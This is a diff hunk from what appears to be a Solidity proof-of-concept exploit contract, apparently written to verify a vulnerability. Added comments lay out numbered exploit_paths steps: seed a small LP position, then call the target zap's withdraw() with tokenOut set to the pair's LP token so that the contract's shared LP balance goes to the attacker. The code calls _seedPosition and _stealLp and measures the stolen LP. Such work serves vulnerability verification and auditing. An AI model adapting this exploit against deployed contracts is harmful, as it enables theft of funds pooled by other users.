@@ -278,9 +283,22 @@
         address token0 = _attempt.token0;
         uint256 existingLp = IERC20(pair).balanceOf(address(this));
         uint256 token0Before = IERC20(token0).balanceOf(address(this));
+
+        // exploit_paths[1]: An attacker obtains a small withdrawable position for the same pair.
+        // The preferred route for this attempt is direct_or_existing_balance_first, so the verifier
+        // first tries with verifier-held token0 and only falls back to a public flash swap when
+        // direct funding is infeasible on-chain.
         uint256 mintedLp = _seedPosition(capitalAmount);
         require(mintedLp >= burnLp, "insufficient minted LP");
 
+        // exploit_paths[2]: The attacker calls
+        // `withdraw(attacker, token0, token1, amount, pair, basketId, address(0), emptyPath, ...)`.
+        // The concrete call below keeps the same causality: withdraw a small legitimate LP position
+        // while setting `tokenOut` to the pair LP token so the zap transfers shared LP instead of
+        // the actual withdrawal proceeds.
+        //
+        // exploit_paths[3]: `withdraw()` removes liquidity and recombines into `token0`/`token1`,
+        // but the final transfer sends `IERC20(pair)` from the contract's shared balance to the attacker.
         _stealLp(pair, token0, _attempt.token1, mintedLp, burnLp);
 
         uint256 stolenLp = IERC20(pair).balanceOf(address(this)) - existingLp;

